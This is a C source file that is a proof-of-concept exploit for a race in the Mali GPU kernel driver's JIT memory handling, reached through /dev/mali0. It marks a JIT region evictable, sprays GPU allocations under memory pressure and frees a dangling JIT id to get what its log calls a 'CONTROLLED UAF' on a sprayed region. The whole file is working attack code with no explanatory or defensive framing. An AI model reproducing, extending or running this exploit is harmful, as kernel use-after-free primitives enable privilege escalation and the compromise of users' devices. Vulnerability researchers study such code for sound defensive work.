#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>

#define KBASE_IOCTL_TYPE 0x80
#define BASE_UK_VERSION_MAJOR 11
#define BASE_UK_VERSION_MINOR 11
#define MEM_PROT (0xFUL)
#define BASE_MEM_DONT_NEED ((uint64_t)1 << 17)
#define BASE_JD_REQ_SOFT_JOB ((uint32_t)1 << 9)
#define BASE_JD_REQ_SOFT_JIT_ALLOC (BASE_JD_REQ_SOFT_JOB | 0x9)
#define BASE_JD_REQ_SOFT_JIT_FREE (BASE_JD_REQ_SOFT_JOB | 0xa)

struct version_check { uint16_t major; uint16_t minor; };
struct set_flags_s { uint32_t create_flags; };
struct job_submit_s { uint64_t addr; uint32_t nr_atoms; uint32_t stride; };
union mem_alloc_u {
	struct { uint64_t va_pages; uint64_t commit_pages; uint64_t extent; uint64_t flags; } in;
	struct { uint64_t flags; uint64_t gpu_addr; } out;
};
union mem_query_u {
	struct { uint64_t gpu_addr; uint64_t query; } in;
	struct { uint64_t value; } out;
};
struct mem_jit_init_s { uint64_t va_pages; uint8_t max_allocations; uint8_t trim_level; uint8_t padding[6]; };
struct mem_flags_change_s { uint64_t gpu_va; uint64_t flags; uint64_t mask; };
struct atom_v2 {
	uint64_t jc;
	uint64_t udata[2];
	uint64_t extres_list;
	uint16_t nr_extres;
	uint16_t compat_core_req;
	uint8_t pre_dep[4];
	uint8_t atom_number;
	uint8_t prio;
	uint8_t device_nr;
	uint8_t pad1;
	uint32_t core_req;
};
struct jit_alloc_info {
	uint64_t gpu_alloc_addr;
	uint64_t va_pages;
	uint64_t commit_pages;
	uint64_t extent;
	uint8_t id;
	uint8_t bin_id;
	uint8_t max_allocations;
	uint8_t flags;
	uint8_t padding[2];
	uint16_t usage_id;
};

_Static_assert(sizeof(struct atom_v2) == 48, "atom");
_Static_assert(sizeof(struct jit_alloc_info) == 40, "info");
_Static_assert(sizeof(union mem_alloc_u) == 32, "ma");
_Static_assert(sizeof(union mem_query_u) == 16, "mq");

#define IOC(d, t, n, s) ((d) << 30 | (s) << 16 | (t) << 8 | (n))
#define IOCTL_VERSION_CHECK IOC(3, KBASE_IOCTL_TYPE, 0, 4)
#define IOCTL_SET_FLAGS IOC(1, KBASE_IOCTL_TYPE, 1, 4)
#define IOCTL_JOB_SUBMIT IOC(1, KBASE_IOCTL_TYPE, 2, 16)
#define IOCTL_MEM_ALLOC IOC(3, KBASE_IOCTL_TYPE, 5, 32)
#define IOCTL_MEM_QUERY IOC(3, KBASE_IOCTL_TYPE, 6, 16)
#define IOCTL_MEM_JIT_INIT IOC(1, KBASE_IOCTL_TYPE, 14, 16)
#define IOCTL_MEM_FLAGS_CHANGE IOC(1, KBASE_IOCTL_TYPE, 23, 24)

#define KBASE_MEM_QUERY_COMMIT_SIZE 1

#define MAX_SPRAY 512

#define LOG(...) do { fprintf(stderr, __VA_ARGS__); fflush(stderr); } while (0)

static int fd;
static volatile int spray_stop;
static uint64_t spray_va[MAX_SPRAY];
static int spray_count;
static int spray_delay_us = 300;

static int submit_atom(struct atom_v2 *a)
{
	struct job_submit_s js = { (uint64_t)(uintptr_t)a, 1, sizeof(*a) };
	return ioctl(fd, IOCTL_JOB_SUBMIT, &js);
}

static int mem_alloc_region(int pages, uint64_t *out_va)
{
	union mem_alloc_u ma;
	memset(&ma, 0, sizeof(ma));
	ma.in.va_pages = pages;
	ma.in.commit_pages = pages;
	ma.in.flags = MEM_PROT;
	if (ioctl(fd, IOCTL_MEM_ALLOC, &ma) != 0)
		return -1;
	*out_va = ma.out.gpu_addr;
	return 0;
}

static long query_commit(uint64_t gpu_va)
{
	union mem_query_u q;
	memset(&q, 0, sizeof(q));
	q.in.gpu_addr = gpu_va;
	q.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
	if (ioctl(fd, IOCTL_MEM_QUERY, &q) != 0)
		return -1;
	return (long)q.out.value;
}

static void *spray_thread(void *arg)
{
	(void)arg;
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(0, &set);
	sched_setaffinity(0, sizeof(set), &set);
	while (!spray_stop && spray_count < MAX_SPRAY) {
		uint64_t va;
		if (mem_alloc_region(2, &va) == 0)
			spray_va[spray_count++] = va;
		usleep(spray_delay_us);
	}
	return NULL;
}

static void pressure_mb_fn(int mb)
{
	pid_t p = fork();
	if (p == 0) {
		int chunks = mb / 16;
		for (int i = 0; i < chunks; i++) {
			void *m = mmap(NULL, 16UL << 20, PROT_READ | PROT_WRITE,
					MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
			if (m == MAP_FAILED)
				break;
		}
		_exit(0);
	}
	int st;
	waitpid(p, &st, 0);
}

int main(int argc, char **argv)
{
	int pmb = argc > 1 ? atoi(argv[1]) : 500;
	if (argc > 2) spray_delay_us = atoi(argv[2]);

	LOG("[*] mustang jit race: pressure=%dMB spray_delay=%dus\n", pmb, spray_delay_us);

	fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
	if (fd < 0) { LOG("[-] open: %s\n", strerror(errno)); return 1; }

	struct version_check vc = { BASE_UK_VERSION_MAJOR, BASE_UK_VERSION_MINOR };
	if (ioctl(fd, IOCTL_VERSION_CHECK, &vc) != 0) { LOG("[-] handshake\n"); return 1; }
	struct set_flags_s sf = { 0 };
	ioctl(fd, IOCTL_SET_FLAGS, &sf);
	void *track = mmap(NULL, 4096, PROT_NONE, MAP_SHARED, fd, 3ull << 12);
	if (track == MAP_FAILED) { LOG("[-] tracking mmap\n"); return 1; }

	uint64_t scratch;
	if (mem_alloc_region(1, &scratch) != 0) { LOG("[-] scratch alloc: %s\n", strerror(errno)); return 1; }
	void *scratch_cpu = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, scratch);
	if (scratch_cpu == MAP_FAILED) { LOG("[-] scratch mmap: %s\n", strerror(errno)); return 1; }
	*(volatile uint64_t *)scratch_cpu = 0;

	struct mem_jit_init_s ji;
	memset(&ji, 0, sizeof(ji));
	ji.va_pages = 0x1000;
	ji.max_allocations = 64;
	if (ioctl(fd, IOCTL_MEM_JIT_INIT, &ji) != 0) { LOG("[-] jit init\n"); return 1; }

	struct jit_alloc_info info;
	memset(&info, 0, sizeof(info));
	info.gpu_alloc_addr = scratch;
	info.va_pages = 0x40;
	info.commit_pages = 0x10;
	info.extent = 0x10;
	info.id = 1;
	info.bin_id = 1;
	struct atom_v2 a;
	memset(&a, 0, sizeof(a));
	a.jc = (uint64_t)(uintptr_t)&info;
	a.nr_extres = 1;
	a.atom_number = 1;
	a.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
	if (submit_atom(&a) != 0) { LOG("[-] jit alloc submit\n"); return 1; }
	sleep(1);
	uint64_t jit_va = *(volatile uint64_t *)scratch_cpu;
	LOG("[+] jit id=1 va=0x%llx commit=%ld\n", (unsigned long long)jit_va, query_commit(jit_va));

	struct mem_flags_change_s fc = { jit_va, BASE_MEM_DONT_NEED, BASE_MEM_DONT_NEED };
	if (ioctl(fd, IOCTL_MEM_FLAGS_CHANGE, &fc) != 0) { LOG("[-] DONT_NEED: %s\n", strerror(errno)); return 1; }
	LOG("[+] marked evictable, starting spray + pressure\n");

	pthread_t th;
	pthread_create(&th, NULL, spray_thread, NULL);
	pressure_mb_fn(pmb);
	spray_stop = 1;
	pthread_join(th, NULL);
	LOG("[+] spray allocated %d regions\n", spray_count);
	sleep(3);

	long jit_q = query_commit(jit_va);
	LOG("[+] post-pressure: jit_va query -> %ld (%s)\n", jit_q, jit_q < 0 ? "INVALID - region freed" : "still alive");

	LOG("[*] submitting JIT_FREE on dangling id=1\n");
	uint8_t ids[2] = { 1, 0 };
	struct atom_v2 f;
	memset(&f, 0, sizeof(f));
	f.jc = (uint64_t)(uintptr_t)ids;
	f.nr_extres = 1;
	f.atom_number = 20;
	f.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
	if (submit_atom(&f) != 0)
		LOG("[-] free submit: %s\n", strerror(errno));
	else
		LOG("[+] free submitted, waiting\n");
	sleep(3);

	int victims = 0;
	for (int i = 0; i < spray_count; i++) {
		long c = query_commit(spray_va[i]);
		if (c == 0 || c < 0) {
			LOG("[+] VICTIM: spray[%d] va=0x%llx commit=%ld\n", i, (unsigned long long)spray_va[i], c);
			victims++;
		}
	}
	LOG(victims ? "[+] CONTROLLED UAF: %d sprayed region(s) hit by jit_free\n" :
		     "[*] no spray victim identified (commit sizes unchanged)\n", victims);
	LOG("[+] SURVIVED\n");
	return 0;
}
